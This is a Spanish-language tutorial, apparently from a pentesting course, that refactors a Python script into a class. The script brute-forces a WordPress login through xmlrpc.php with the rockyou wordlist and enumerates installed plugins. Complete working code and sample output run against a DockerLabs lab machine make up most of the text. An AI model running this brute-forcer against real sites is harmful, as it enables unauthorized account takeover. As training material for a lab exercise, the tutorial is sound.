Lo que haremos hoy será convertir el código siguiente en programación orientada a objectos:

````python
import sys
import requests


def bruteforce():
    url = 'http://172.17.0.2/wordpress/xmlrpc.php'
    username = 'luisillo'
    rockyou_path = 'diccionario.txt'

    with open(rockyou_path, 'r', encoding='latin-1') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value>{username}</value></param>
                <param><value>{password}</value></param>
            </params>
        </methodCall>"""

        print(f"[+] Probamos con la contraseña {password}")
        response = requests.post(url, data=xml_payload)

        if 'incorrectos.' not in response.text:
            print(f"[+] La contraseña del usuario {username} es {password}")
            sys.exit(0)


def plugin_enumeration():
    plugins = (
        "jetpack",
        "akismet",
        "contact-form-7",
        "woocommerce",
        "wordfence",
        "yoast-seo",
        "elementor",
        "w3-total-cache",
        "updraftplus",
        "wpforms",
        "wpmu-dev-forminator"
        #resto de plugins
    )

    base_url = "http://172.17.0.2/wordpress/wp-content/plugins/"

    for plugin in plugins:
        url = f"{base_url}{plugin}/readme.txt"
        response = requests.get(url)
        
        if response.status_code == 200:
            print(f"[+] Plugin encontrado: {plugin}")


choice = input("Introduce 1 para ejecutar la función 'bruteforce' o 2 para ejecutar 'plugin_enumeration': ")

if choice == '1':
    bruteforce()
elif choice == '2':
    plugin_enumeration()
else:
    print("Opción no válida.")
`````

---

### **Paso 1: Entendiendo el código original**

El código original tiene dos funciones principales:
- `bruteforce()`: Realiza un ataque de fuerza bruta contra `xmlrpc.php` usando un diccionario de contraseñas (`rockyou.txt`) para el usuario `luisillo`.
- `plugin_enumeration()`: Enumera plugins de WordPress verificando la existencia de archivos `readme.txt` en la ruta `/wp-content/plugins/`.
- Una interfaz simple (`input`) permite al usuario elegir entre las dos tareas.

Queremos encapsular estas funcionalidades en una clase `Herramienta` que:
- Almacene la configuración (URLs, usuario, diccionario, lista de plugins) como atributos.
- Implemente métodos para cada tarea (`fuerza_bruta` y `enumerar_plugins`).
- Mantenga la lógica de selección de tareas fuera de la clase, como en el código original.

Además, vamos a:
- Usar la máquina vulnerable "Escolares" de DockerLabs, como indicaste.
- Asegurarnos de que el diccionario `rockyou.txt` esté disponible.
- Corregir errores en los intentos intermedios (por ejemplo, problemas de sintaxis, variables mal definidas, o lógica redundante).

---

### **Paso 2: Configuración del entorno**

Antes de escribir el código, preparamos el entorno para probar la herramienta:

1. **Descarga de la máquina "Escolares"**:
   - Vamos a la plataforma DockerLabs y descargamos la máquina "Escolares" (por ejemplo, desde un enlace en Mega).
   - Obtenemos el archivo `escolares.zip` y lo descomprimimos en el escritorio, lo que nos da `escolares.tar`.

2. **Despliegue en Docker**:
   - Abrimos una terminal en el escritorio y ejecutamos:
     ```bash
     sudo bash autodeploy.sh escolares.tar
     ```
   - Introducimos la contraseña de nuestro usuario cuando se solicite.
   - Esto despliega la máquina, y asumimos que la IP asignada es `172.17.0.2`
   
2. **Configuración de `/etc/hosts`**:
   - Accedemos al WordPress en `http://172.17.0.2/wordpress/`.
   - Si la página no carga correctamente (por ejemplo, aparece como "el horto"), editamos el archivo de hosts:
     ```bash
     sudo nano /etc/hosts
     ```
   - Añadimos la línea:
     ```
     172.17.0.2 escolares.dl
     ```
   - Guardamos con `Ctrl + O`, `Enter`, y salimos con `Ctrl + X`.
   - Ahora, al visitar `http://escolares.dl/wordpress/`, la página se ve correctamente.

4. **Descarga de `rockyou.txt`**:
   - Descargamos el diccionario `rockyou.txt` (por ejemplo, buscándolo en Google).
   - Lo descomprimimos (si es necesario) y lo movemos al escritorio, donde estará nuestro script.

Con el entorno listo, pasamos al código.

---

### **Paso 3: Estructura inicial de la clase**

Vamos a crear una clase `Herramienta` que encapsule toda la lógica. Empezamos definiendo la estructura básica y los atributos necesarios.

1. **Importaciones**:
   - Necesitamos `requests` para las peticiones HTTP y `sys` para salir del programa cuando encontremos una contraseña válida.
     ```python
     import requests
     import sys
     ```

2. **Definición de la clase y constructor**:
   - Creamos la clase `Herramienta` con un constructor (`__init__`) que reciba los parámetros necesarios:
     - `url_xmlrpc`: URL del archivo `xmlrpc.php` (para fuerza bruta).
     - `usuario`: Nombre de usuario a atacar.
     - `diccionario`: Ruta al archivo de contraseñas.
     - `url_plugins`: URL base para enumerar plugins.
     - `listado_plugins`: Lista de plugins a verificar.
   - Almacenamos estos parámetros como atributos de la instancia.
     ```python
     class Herramienta:
         def __init__(self, url_xmlrpc, usuario, diccionario, url_plugins, listado_plugins):
             self.url_xmlrpc = url_xmlrpc
             self.usuario = usuario
             self.diccionario = diccionario
             self.url_plugins = url_plugins
             self.listado_plugins = listado_plugins
     ```

---

### **Paso 4: Implementar el método `fuerza_bruta`**

Ahora añadimos el método para el ataque de fuerza bruta, basado en la función `bruteforce()` del código original.

1. **Definición del método**:
   - Creamos el método `fuerza_bruta` dentro de la clase:
     ```python
     def fuerza_bruta(self):
     ```

2. **Lectura del diccionario**:
   - Abrimos el archivo de contraseñas (`self.diccionario`) y leemos las líneas:
     ```python
     with open(self.diccionario, 'r', encoding='latin-1') as file:
         passwords = file.readlines()
     ```
   - Usamos `encoding='latin-1'` para manejar caracteres especiales, como en el código original.

3. **Bucle de fuerza bruta**:
   - Iteramos sobre las contraseñas, limpiándolas con `strip()`:
     ```python
     for password in passwords:
         password = password.strip()
     ```

4. **Construcción del payload XML**:
   - Creamos el payload para el método `wp.getUsersBlogs`, usando el usuario y la contraseña actual:
     ```python
     xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
     <methodCall>
         <methodName>wp.getUsersBlogs</methodName>
         <params>
             <param><value>{self.usuario}</value></param>
             <param><value>{password}</value></param>
         </params>
     </methodCall>"""
     ```

5. **Envío de la petición**:
   - Enviamos el payload mediante POST a `self.url_xmlrpc`:
     ```python
     print(f"[+] Probamos con la contraseña {password}")
     response = requests.post(self.url_xmlrpc, data=xml_payload)
     ```

6. **Verificación de la respuesta**:
   - Si la respuesta no contiene "incorrectos.", asumimos que la contraseña es correcta:
     ```python
     if 'incorrectos.' not in response.text:
         print(f"[+] La contraseña del usuario {self.usuario} es {password}")
         sys.exit(0)
     ```

El método completo queda así:
```python
def fuerza_bruta(self):
    with open(self.diccionario, 'r', encoding='latin-1') as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value>{self.usuario}</value></param>
                <param><value>{password}</value></param>
            </params>
        </methodCall>"""
        
        print(f"[+] Probamos con la contraseña {password}")
        response = requests.post(self.url_xmlrpc, data=xml_payload)
        
        if 'incorrectos.' not in response.text:
            print(f"[+] La contraseña del usuario {self.usuario} es {password}")
            sys.exit(0)
```

---

### **Paso 5: Implementar el método `enumerar_plugins`**

Ahora implementamos el método para enumerar plugins, basado en la función `plugin_enumeration()`.

1. **Definición del método**:
   - Creamos el método `enumerar_plugins`:
     ```python
     def enumerar_plugins(self):
     ```

2. **Bucle sobre los plugins**:
   - Iteramos sobre la lista de plugins almacenada en `self.listado_plugins`:
     ```python
     for plugin in self.listado_plugins:
     ```

3. **Construcción de la URL**:
   - Formamos la URL para el archivo `readme.txt` de cada plugin:
     ```python
     url = f"{self.url_plugins}{plugin}/readme.txt"
     ```

4. **Envío de la petición**:
   - Hacemos una petición GET a la URL:
     ```python
     response = requests.get(url)
     ```

5. **Verificación de la respuesta**:
   - Si el código de estado es `200`, el plugin existe:
     ```python
     if response.status_code == 200:
         print(f"[+] Plugin encontrado: {plugin}")
     ```

El método completo queda así:
```python
def enumerar_plugins(self):
    for plugin in self.listado_plugins:
        url = f"{self.url_plugins}{plugin}/readme.txt"
        response = requests.get(url)
        if response.status_code == 200:
            print(f"[+] Plugin encontrado: {plugin}")
```

---

### **Paso 6: Código principal (instanciación y selección de tarea)**

Fuera de la clase, creamos una instancia de `Herramienta` y manejamos la interacción con el usuario.

1. **Definición de parámetros**:
   - Definimos los valores para los atributos de la clase:
     ```python
     url_xmlrpc = 'http://172.17.0.2/wordpress/xmlrpc.php'
     usuario = 'luisillo'
     diccionario = 'rockyou.txt'
     url_plugins = 'http://172.17.0.2/wordpress/wp-content/plugins/'
     listado_plugins = [
         "jetpack",
         "akismet",
         "contact-form-7",
         "woocommerce",
         "wordfence",
         "yoast-seo",
         "elementor",
         "w3-total-cache",
         "updraftplus",
         "wpforms",
         "wpmu-dev-forminator"
     ]
     ```

2. **Instanciación**:
   - Creamos un objeto de la clase `Herramienta`:
     ```python
     objeto_ataque = Herramienta(url_xmlrpc, usuario, diccionario, url_plugins, listado_plugins)
     ```

3. **Interfaz de usuario**:
   - Pedimos al usuario que elija una tarea:
     ```python
     eleccion = input("Escribe un 1 si quieres hacer fuerza bruta, y 2 si quieres enumerar plugins: ")
     ```

4. **Ejecución condicional**:
   - Llamamos al método correspondiente según la elección:
     ```python
     if eleccion == '1':
         objeto_ataque.fuerza_bruta()
     elif eleccion == '2':
         objeto_ataque.enumerar_plugins()
     else:
         print("Datos incorrectos, debes poner un 1 o un 2")
     ```

---

### **Paso 7: Código completo**

Aquí está el código final, integrando todas las correcciones y optimizaciones:

```python
import requests
import sys

class Herramienta:
    def __init__(self, url_xmlrpc, usuario, diccionario, url_plugins, listado_plugins):
        self.url_xmlrpc = url_xmlrpc
        self.usuario = usuario
        self.diccionario = diccionario
        self.url_plugins = url_plugins
        self.listado_plugins = listado_plugins
    
    def fuerza_bruta(self):
        with open(self.diccionario, 'r', encoding='latin-1') as file:
            passwords = file.readlines()
        
        for password in passwords:
            password = password.strip()
            xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
            <methodCall>
                <methodName>wp.getUsersBlogs</methodName>
                <params>
                    <param><value>{self.usuario}</value></param>
                    <param><value>{password}</value></param>
                </params>
            </methodCall>"""
            
            print(f"[+] Probamos con la contraseña {password}")
            response = requests.post(self.url_xmlrpc, data=xml_payload)
            
            if 'incorrectos.' not in response.text:
                print(f"[+] La contraseña del usuario {self.usuario} es {password}")
                sys.exit(0)
    
    def enumerar_plugins(self):
        for plugin in self.listado_plugins:
            url = f"{self.url_plugins}{plugin}/readme.txt"
            response = requests.get(url)
            if response.status_code == 200:
                print(f"[+] Plugin encontrado: {plugin}")

url_xmlrpc = 'http://172.17.0.2/wordpress/xmlrpc.php'
usuario = 'luisillo'
diccionario = 'rockyou.txt'
url_plugins = 'http://172.17.0.2/wordpress/wp-content/plugins/'
listado_plugins = [
    "jetpack",
    "akismet",
    "contact-form-7",
    "woocommerce",
    "wordfence",
    "yoast-seo",
    "elementor",
    "w3-total-cache",
    "updraftplus",
    "wpforms",
    "wpmu-dev-forminator"
]

objeto_ataque = Herramienta(url_xmlrpc, usuario, diccionario, url_plugins, listado_plugins)

eleccion = input("Escribe un 1 si quieres hacer fuerza bruta, y 2 si quieres enumerar plugins: ")

if eleccion == '1':
    objeto_ataque.fuerza_bruta()
elif eleccion == '2':
    objeto_ataque.enumerar_plugins()
else:
    print("Datos incorrectos, debes poner un 1 o un 2")
```

---

### **Paso 8: Pruebas**

Guardamos el script como `herramienta_oo.py` y lo probamos:

1. **Preparación del diccionario**:
   - Aseguramos que `rockyou.txt` está en el escritorio.
   - Como en el caso original, la contraseña correcta es `LUIS1981`. Si no está en `rockyou.txt`, la añadimos manualmente:
     - Abrimos `rockyou.txt` con un editor (por ejemplo, `nano rockyou.txt`).
     - Añadimos `LUIS1981` en una línea y guardamos.

2. **Ejecución de fuerza bruta**:
   - Ejecutamos:
     ```bash
     python3 herramienta_oo.py
     ```
   - Introducimos `1` y presionamos Enter.
   - El script prueba contraseñas y eventualmente encuentra:
     ```
     [+] Probamos con la contraseña LUIS1981
     [+] La contraseña del usuario luisillo es LUIS1981
     ```

3. **Ejecución de enumeración de plugins**:
   - Ejecutamos de nuevo:
     ```bash
     python3 herramienta_oo.py
     ```
   - Introducimos `2`.
   - El script enumera plugins y muestra, por ejemplo:
     ```
     [+] Plugin encontrado: akismet
     ```
   - Verificamos en el navegador (por ejemplo, `http://172.17.0.2/wordpress/wp-content/plugins/akismet/readme.txt`) y confirmamos que el plugin existe.

4. **Prueba de opción inválida**:
   - Ejecutamos y ponemos `3`:
     ```
     Datos incorrectos, debes poner un 1 o un 2
     ```

---

### **Paso 9: Reflexión y mejoras**

El código orientado a objetos cumple los objetivos:
- **Encapsulación**: La clase `Herramienta` agrupa toda la lógica y los datos relacionados.
- **Reusabilidad**: Podemos crear múltiples instancias con diferentes configuraciones (URLs, usuarios, etc.).
- **Claridad**: La estructura es más organizada que el código procedural.

**Posibles mejoras**:
- Añadir manejo de excepciones (por ejemplo, si `rockyou.txt` no existe o la conexión falla).
- Implementar un método para cargar la lista de plugins desde un archivo.
- Agregar una interfaz más avanzada (por ejemplo, con `argparse` para opciones de línea de comandos).
- Optimizar la enumeración de plugins usando hilos para hacer peticiones en paralelo.

---

### **Paso 10: Conclusión**

Hemos transformado con éxito el script original en una versión orientada a objetos, manteniendo toda la funcionalidad y mejorando la estructura. La clase `Herramienta` es modular, fácil de entender y extensible. Probamos el código en el entorno de la máquina "Escolares" y confirmamos que tanto la fuerza bruta como la enumeración de plugins funcionan correctamente.




[[10- Creamos una Herramienta para Enumerar y Atacar Plugins de WordPress]]